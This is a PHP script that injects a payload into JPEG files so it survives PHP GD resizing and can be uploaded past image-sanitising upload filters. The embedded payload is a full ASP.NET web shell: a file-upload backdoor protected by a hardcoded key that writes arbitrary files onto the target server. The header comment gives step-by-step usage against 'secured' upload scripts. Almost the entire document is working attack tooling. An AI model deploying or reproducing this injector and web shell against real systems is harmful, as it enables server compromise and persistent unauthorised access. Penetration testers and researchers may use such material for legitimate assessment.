<?php
        /*
 
        The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations
        caused by PHP functions imagecopyresized() and imagecopyresampled().
        It is necessary that the size and quality of the initial image are the same as those of the processed
        image.
 
        1) Upload an arbitrary image via secured files upload script
        2) Save the processed image and launch:
        php jpg_payload.php <jpg_name.jpg>
 
        In case of successful injection you will get a specially crafted image, which should be uploaded again.
 
        Since the most straightforward injection method is used, the following problems can occur:
        1) After the second processing the injected data may become partially corrupted.
        2) The jpg_payload.php script outputs "Something's wrong".
        If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another
        initial image.
 
        Sergey Bobrov @Black2Fan.
 
        See also:
        https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
 
        */
 
        $miniPayload = '<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">
    private const string AUTHKEY = "woanware";
    private const string HEADER = "<html>\n<head>\n<title>filesystembrowser</title>\n<style type=\"text/css\"><!--\nbody,table,p,pre,form input,form select {\n font-family: \"Lucida Console\", monospace;\n font-size: 88%;\n}\n-->\n</style></head>\n<body>\n";
    private const string FOOTER = "</body>\n</html>\n";
    /// <summary>
    /// 
    /// </summary>
    /// <param name="sender"></param>
    /// <param name="e"></param>
    protected void Page_Load(object sender, EventArgs e)
    {
        try
        {
            if (Request.Params["authkey"] == null)
            {
                Response.Write(HEADER);
                Response.Write(this.GetUploadControls());
                Response.Write(FOOTER);
                return;
            }
            if (Request.Params["authkey"] != AUTHKEY)
            {
                Response.Write(HEADER);
                Response.Write(this.GetUploadControls());
                Response.Write(FOOTER);
                return;
            }
            
            if (Request.Params["operation"] != null)
            {
                if (Request.Params["operation"] == "upload")
                {
                    Response.Write(HEADER);
                    Response.Write(this.UploadFile());
                    Response.Write(FOOTER);
                }
                else
                {
                    Response.Write(HEADER);
                    Response.Write("Unknown operation");
                    Response.Write(FOOTER);
                }
            }
            else
            {
                Response.Write(HEADER);
                Response.Write(this.GetUploadControls());
                Response.Write(FOOTER);
            }
        }
        catch (Exception ex)
        {
            Response.Write(HEADER);
            Response.Write(ex.Message);
            Response.Write(FOOTER);
        }
    }
    /// <summary>
    /// 
    /// </summary>
    private string UploadFile()
    {
        try
        {
            if (Request.Params["authkey"] == null)
            {
                return string.Empty;
            }
            if (Request.Params["authkey"] != AUTHKEY)
            {
                return string.Empty;
            }
            
            if (Request.Files.Count != 1)
            {
                return "No file selected";
            }
            HttpPostedFile httpPostedFile = Request.Files[0];
            int fileLength = httpPostedFile.ContentLength;
            byte[] buffer = new byte[fileLength];
            httpPostedFile.InputStream.Read(buffer, 0, fileLength);
            FileInfo fileInfo = new FileInfo(Request.PhysicalPath);
            using (FileStream fileStream = new FileStream(Path.Combine(fileInfo.DirectoryName, Path.GetFileName(httpPostedFile.FileName)), FileMode.Create))
            {
                fileStream.Write(buffer, 0, buffer.Length);
            }
            return "File uploaded";
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }
    /// <summary>
    /// 
    /// </summary>
    /// <returns></returns>
    private string GetUploadControls()
    {
        string temp = string.Empty;
        temp = "<form enctype=\"multipart/form-data\" action=\"?operation=upload\" method=\"post\">";
        temp += "<br>Auth Key: <input type=\"text\" name=\"authKey\"><br>";
        temp += "<br>Please specify a file: <input type=\"file\" name=\"file\"></br>";
        temp += "<div><input type=\"submit\" value=\"Send\"></div>";
        temp += "</form>";
        return temp;
    }
</script>';
 
        if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
        }
       
        if(!isset($argv[1])) {
                die('php jpg_payload.php <jpg_name.jpg>');
        }
 
        set_error_handler("custom_error_handler");
 
        for($pad = 0; $pad < 1024; $pad++) {
                $nullbytePayloadSize = $pad;
                $dis = new DataInputStream($argv[1]);
                $outStream = file_get_contents($argv[1]);
                $extraBytes = 0;
                $correctImage = TRUE;
 
                if($dis->readShort() != 0xFFD8) {
                        die('Incorrect SOI marker');
                }
 
                while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
                        $marker = $dis->readByte();
                        $size = $dis->readShort() - 2;
                        $dis->skip($size);
                        if($marker === 0xDA) {
                                $startPos = $dis->seek();
                                $outStreamTmp =
                                        substr($outStream, 0, $startPos) .
                                        $miniPayload .
                                        str_repeat("\0",$nullbytePayloadSize) .
                                        substr($outStream, $startPos);
                                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                                if($extraBytes !== 0) {
                                        while((!$dis->eof())) {
                                                if($dis->readByte() === 0xFF) {
                                                        if($dis->readByte !== 0x00) {
                                                                break;
                                                        }
                                                }
                                        }
                                        $stopPos = $dis->seek() - 2;
                                        $imageStreamSize = $stopPos - $startPos;
                                        $outStream =
                                                substr($outStream, 0, $startPos) .
                                                $miniPayload .
                                                substr(
                                                        str_repeat("\0",$nullbytePayloadSize).
                                                                substr($outStream, $startPos, $imageStreamSize),
                                                        0,
                                                        $nullbytePayloadSize+$imageStreamSize-$extraBytes) .
                                                                substr($outStream, $stopPos);
                                } elseif($correctImage) {
                                        $outStream = $outStreamTmp;
                                } else {
                                        break;
                                }
                                if(checkImage('payload_'.$argv[1], $outStream)) {
                                        die('Success!');
                                } else {
                                        break;
                                }
                        }
                }
        }
        unlink('payload_'.$argv[1]);
        die('Something\'s wrong');
 
        function checkImage($filename, $data, $unlink = FALSE) {
                global $correctImage;
                file_put_contents($filename, $data);
                $correctImage = TRUE;
                imagecreatefromjpeg($filename);
                if($unlink)
                        unlink($filename);
                return $correctImage;
        }
 
        function custom_error_handler($errno, $errstr, $errfile, $errline) {
                global $extraBytes, $correctImage;
                $correctImage = FALSE;
                if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
                        if(isset($m[1])) {
                                $extraBytes = (int)$m[1];
                        }
                }
        }
 
        class DataInputStream {
                private $binData;
                private $order;
                private $size;
 
                public function __construct($filename, $order = false, $fromString = false) {
                        $this->binData = '';
                        $this->order = $order;
                        if(!$fromString) {
                                if(!file_exists($filename) || !is_file($filename))
                                        die('File not exists ['.$filename.']');
                                $this->binData = file_get_contents($filename);
                        } else {
                                $this->binData = $filename;
                        }
                        $this->size = strlen($this->binData);
                }
 
                public function seek() {
                        return ($this->size - strlen($this->binData));
                }
 
                public function skip($skip) {
                        $this->binData = substr($this->binData, $skip);
                }
 
                public function readByte() {
                        if($this->eof()) {
                                die('End Of File');
                        }
                        $byte = substr($this->binData, 0, 1);
                        $this->binData = substr($this->binData, 1);
                        return ord($byte);
                }
 
                public function readShort() {
                        if(strlen($this->binData) < 2) {
                                die('End Of File');
                        }
                        $short = substr($this->binData, 0, 2);
                        $this->binData = substr($this->binData, 2);
                        if($this->order) {
                                $short = (ord($short[1]) << 8) + ord($short[0]);
                        } else {
                                $short = (ord($short[0]) << 8) + ord($short[1]);
                        }
                        return $short;
                }
 
                public function eof() {
                        return !$this->binData||(strlen($this->binData) === 0);
                }
        }
?>
